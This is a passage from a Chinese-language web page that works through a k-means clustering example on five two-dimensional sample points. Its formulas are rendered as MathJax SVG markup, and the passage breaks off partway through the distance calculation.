title="k均值聚类"><p>例子：</p><p>给定含有5个样本的集合</p><script type="math/tex; mode=display">X=\begin{pmatrix}0&0&1&5&5\\2&0&0&0&2\end{pmatrix}</script><p>试用k均值聚类算法将样本聚到2个类中。</p><p>解：</p><p>选择两个样本点作为类的中心。假设选择<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.673ex" xmlns="http://www.w3.org/2000/svg" width="38.818ex" height="3.072ex" role="img" focusable="false" viewBox="0 -1060.7 17157.8 1358"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msubsup"><g data-mml-node="mi"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="TeXAtom" transform="translate(911,530.4) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mo"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mn" transform="translate(389,0)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"></path></g><g data-mml-node="mo" transform="translate(889,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g><g data-mml-node="mn" transform="translate(911,-297.3) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g><g data-mml-node="mo" transform="translate(2142.5,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="msub" transform="translate(3198.2,0)"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mn" transform="translate(605,-150) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g><g data-mml-node="mo" transform="translate(4484.6,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mo" transform="translate(5540.3,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mn" transform="translate(5929.3,0)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"></path></g><g data-mml-node="mo" transform="translate(6429.3,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mn" transform="translate(6874,0)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="msup" transform="translate(7374,0)"><g data-mml-node="mo"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="TeXAtom" transform="translate(422,363) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="54" d="M36 443Q37 448 46 558T55 671V677H666V671Q667 666 676 556T685 443V437H645V443Q645 445 642 478T631 544T610 593Q593 614 555 625Q534 630 478 630H451H443Q417 630 414 618Q413 616 413 339V63Q420 53 439 50T528 46H558V0H545L361 3Q186 1 177 0H164V46H194Q264 46 283 49T309 63V339V550Q309 620 304 625T271 630H244H224Q154 630 119 601Q101 585 93 554T81 486T76 443V437H36V443Z"></path></g></g></g><g data-mml-node="mo" transform="translate(8356.5,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="msubsup" transform="translate(8801.2,0)"><g data-mml-node="mi"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="TeXAtom" transform="translate(911,530.4) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mo"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mn" transform="translate(389,0)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"></path></g><g data-mml-node="mo" transform="translate(889,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g><g data-mml-node="mn" transform="translate(911,-297.3) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g><g data-mml-node="mo" transform="translate(10943.7,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="msub" transform="translate(11999.4,0)"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mn" transform="translate(605,-150) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g><g data-mml-node="mo" transform="translate(13285.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mo" transform="translate(14341.6,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mn" transform="translate(14730.6,0)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"></path></g><g data-mml-node="mo" transform="translate(15230.6,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mn" transform="translate(15675.2,0)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"></path></g><g data-mml-node="msup" transform="translate(16175.2,0)"><g data-mml-node="mo"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="TeXAtom" transform="translate(422,363) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="54" d="M36 443Q37 448 46 558T55 671V677H666V671Q667 666 676 556T685 443V437H645V443Q645 445 642 478T631 544T610 593Q593 614 555 625Q534 630 478 630H451H443Q417 630 414 618Q413 616 413 339V63Q420 53 439 50T528 46H558V0H545L361 3Q186 1 177 0H164V46H194Q264 46 283 49T309 63V339V550Q309 620 304 625T271 630H244H224Q154 630 119 601Q101 585 93 554T81 486T76 443V437H36V443Z"></path></g></g></g></g></g></svg></mjx-container>。</p><p>以<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.673ex" xmlns="http://www.w3.org/2000/svg" width="9.444ex" height="3.072ex" role="img" focusable="false" viewBox="0 -1060.7 4174 1358"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msubsup"><g data-mml-node="mi"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="TeXAtom" transform="translate(911,530.4) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mo"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mn" transform="translate(389,0)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"></path></g><g data-mml-node="mo" transform="translate(889,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g><g data-mml-node="mn" transform="translate(911,-297.3) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g><g data-mml-node="mo" transform="translate(1864.7,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="msubsup" transform="translate(2309.3,0)"><g data-mml-node="mi"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="TeXAtom" transform="translate(911,530.4) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mo"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mn" transform="translate(389,0)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"></path></g><g data-mml-node="mo" transform="translate(889,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g><g data-mml-node="mn" transform="translate(911,-297.3) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g></g></g></svg></mjx-container>为类<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.673ex" xmlns="http://www.w3.org/2000/svg" width="9.027ex" height="3.072ex" role="img" focusable="false" viewBox="0 -1060.7 3990 1358"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msubsup"><g data-mml-node="mi"><path data-c="1D43A" d="M50 252Q50 367 117 473T286 641T490 704Q580 704 633 653Q642 643 648 636T656 626L657 623Q660 623 684 649Q691 655 699 663T715 679T725 690L740 705H746Q760 705 760 698Q760 694 728 561Q692 422 692 421Q690 416 687 415T669 413H653Q647 419 647 422Q647 423 648 429T650 449T651 481Q651 552 619 605T510 659Q492 659 471 656T418 643T357 615T294 567T236 496T189 394T158 260Q156 242 156 221Q156 173 170 136T206 79T256 45T308 28T353 24Q407 24 452 47T514 106Q517 114 529 161T541 214Q541 222 528 224T468 227H431Q425 233 425 235T427 254Q431 267 437 273H454Q494 271 594 271Q634 271 659 271T695 272T707 272Q721 272 721 263Q721 261 719 249Q714 230 709 228Q706 227 694 227Q674 227 653 224Q646 221 643 215T629 164Q620 131 614 108Q589 6 586 3Q584 1 581 1Q571 1 553 21T530 52Q530 53 528 52T522 47Q448 -22 322 -22Q201 -22 126 55T50 252Z"></path></g><g data-mml-node="TeXAtom" transform="translate(819,530.4) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mo"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mn" transform="translate(389,0)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"></path></g><g data-mml-node="mo" transform="translate(889,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g><g data-mml-node="mn" transform="translate(819,-297.3) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g><g data-mml-node="mo" transform="translate(1772.7,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="msubsup" transform="translate(2217.3,0)"><g data-mml-node="mi"><path data-c="1D43A" d="M50 252Q50 367 117 473T286 641T490 704Q580 704 633 653Q642 643 648 636T656 626L657 623Q660 623 684 649Q691 655 699 663T715 679T725 690L740 705H746Q760 705 760 698Q760 694 728 561Q692 422 692 421Q690 416 687 415T669 413H653Q647 419 647 422Q647 423 648 429T650 449T651 481Q651 552 619 605T510 659Q492 659 471 656T418 643T357 615T294 567T236 496T189 394T158 260Q156 242 156 221Q156 173 170 136T206 79T256 45T308 28T353 24Q407 24 452 47T514 106Q517 114 529 161T541 214Q541 222 528 224T468 227H431Q425 233 425 235T427 254Q431 267 437 273H454Q494 271 594 271Q634 271 659 271T695 272T707 272Q721 272 721 263Q721 261 719 249Q714 230 709 228Q706 227 694 227Q674 227 653 224Q646 221 643 215T629 164Q620 131 614 108Q589 6 586 3Q584 1 581 1Q571 1 553 21T530 52Q530 53 528 52T522 47Q448 -22 322 -22Q201 -22 126 55T50 252Z"></path></g><g data-mml-node="TeXAtom" transform="translate(819,530.4) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mo"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mn" transform="translate(389,0)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"></path></g><g data-mml-node="mo" transform="translate(889,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g><g data-mml-node="mn" transform="translate(819,-297.3) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g></g></g></svg></mjx-container>的中心，计算<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex" xmlns="http://www.w3.org/2000/svg" width="37.023ex" height="2.47ex" role="img" focusable="false" viewBox="0 -841.7 16364.3 1091.7"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mn" transform="translate(605,-150) scale(0.707)"><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 